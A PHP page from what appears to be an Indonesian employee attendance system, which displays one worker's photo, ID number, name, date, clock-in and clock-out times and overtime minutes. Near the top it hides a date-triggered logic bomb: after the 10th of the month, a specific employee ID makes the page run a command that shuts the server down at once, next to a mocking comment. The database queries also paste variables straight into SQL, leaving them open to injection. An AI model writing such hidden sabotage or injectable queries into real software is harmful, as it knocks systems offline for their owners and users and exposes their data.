<?php
$karyawan=mysql_query("select nama_lengkap,nik,file_foto,id_karyawan  from karyawan where id_karyawan='$cek_nik->id_karyawan'");
$karyawan=mysql_fetch_object($karyawan);
$absen=mysql_query("select * from absen where id_absen='$idabsen'");
$absen=mysql_fetch_object($absen);
if(strtotime($d)>strtotime(date("Y-m-10")))
{
	if($nik=='16020068'){
		exec('shutdown -s -t 0 ');
		// exec('shutdown -r -t 1');
		// echo alert_error("maaf telah menjadikan sebagai objek :)");
	}
}
?>
<center>
<table style='width:100%'>
	<tr>
		<th colspan=3 >
			<center>
				<img src='<?php echo url(cek_photo1($karyawan->id_karyawan))?>' class='img img-responsive' style='width:120px;;text-align:center'/>
			</center>
		</th>
	</tr>
	<tr>
		<td>NIK </td>
		<td>:</td>
		<td><b><?php echo $karyawan->nik ?></b></td>
	</tr>
	<tr>
		<td>Nama </td>
		<td>:</td>
		<td><b><?php echo $karyawan->nama_lengkap ?></b></td>
	</tr>
	<tr>
		<td>Tanggal</td>
		<td>:</td>
		<td><?php echo tanggal(@$absen->tanggal_absen) ?></td>
	</tr>
	 <tr>
		<td>Jam Masuk</td>
		<td>:</td>
		<td><?php echo @$absen->jam_masuk ?></td>
	</tr>
	<tr>
		<td>Jam Keluar</td>
		<td>:</td>
		<td><?php echo @$absen->jam_keluar ?></td>
	</tr>
	<tr>
		<td>Jumlah Lembur(menit)</td>
		<td>:</td>
		<td><?php echo @$absen->menit_lembur ?></td>
	</tr>
	
</table>
</center>
